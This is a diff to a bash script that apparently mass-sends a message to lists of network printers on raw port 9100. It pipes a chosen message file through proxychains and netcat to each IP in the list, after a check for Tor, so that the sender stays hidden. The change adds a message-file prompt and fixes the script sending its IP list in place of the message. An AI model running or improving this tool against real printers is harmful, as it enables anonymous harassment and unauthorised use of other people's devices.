@@ -206,6 +206,7 @@ banner
 dependencies
 checktor
 read -p $'\e[1;92m[::] Ip list file: \e[0m ' printer_file
+read -p $'\e[1;92m[::] Message file: \e[0m ' msg
 
 default_port=9100
 read -p $'\e[1;37m[::] Port\e[0m \e[1;91m(Default 9100):\e[0m ' port
@@ -225,7 +226,7 @@ while [ $count -lt $count_target ]; do
 for target in $(sed -n ''$startline','$endline'p' $printer_file); do
 let count++
 printf "\e[1;93mSending message to:\e[0m\e[77m %s \e[0m\e[1;93m(\e[0m\e[77m%s\e[0m\e[1;93m/\e[0m\e[77m%s\e[0m\e[1;93m)\e[0m\n" $target $count $count_target
-{(trap '' SIGINT && echo "$(cat $printer_file)" | proxychains nc $target $port > /dev/null 2>&1; )  } & done; pid=$! ; wait $!;
+{(trap '' SIGINT && echo "$(cat $msg)" | proxychains nc $target $port > /dev/null 2>&1; )  } & done; pid=$! ; wait $!;
 let startline+=$threads2
 let endline+=$threads2
 done
